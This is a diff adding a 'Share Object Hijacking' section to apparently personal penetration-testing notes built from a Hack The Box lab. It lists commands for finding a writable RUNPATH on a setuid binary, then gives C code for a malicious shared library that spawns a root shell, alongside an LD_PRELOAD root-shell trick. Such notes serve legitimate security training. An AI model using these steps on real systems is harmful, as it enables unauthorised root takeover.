@@ -78,7 +78,52 @@ system("/bin/bash");
 gcc -fPIC -shared -o root.so root.c -nostartfiles
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ```
+##### Share Object Hijacking
+```bash
+htb_student@NIX02:~$ ls -la payroll
+-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
+ldd to print the shared object required by a binary or shared object.
 
+htb_student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 =>  (0x00007ffcb3133000)
+libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+
+htb_student@NIX02:~$ readelf -d payroll  | grep PATH
+0x000000000000001d (RUNPATH)            Library runpath: [/development]
+
+writeable
+htb_student@NIX02:~$ ls -la /development/
+
+total 8
+drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
+drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
+
+Before compiling a library, we need to find the function name called by the binary.
+htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+
+htb_student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 (0x00007ffd22bbc000)
+libshared.so => /development/libshared.so (0x00007f0c13112000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+
+htb_student@NIX02:~$ ./payroll 
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+
+#include<stdio.h>
+#include<stdlib.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+
+gcc src.c -fPIC -shared -o /development/libshared.so
+```
 ### Kernel Exploits
 ```bash
 Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
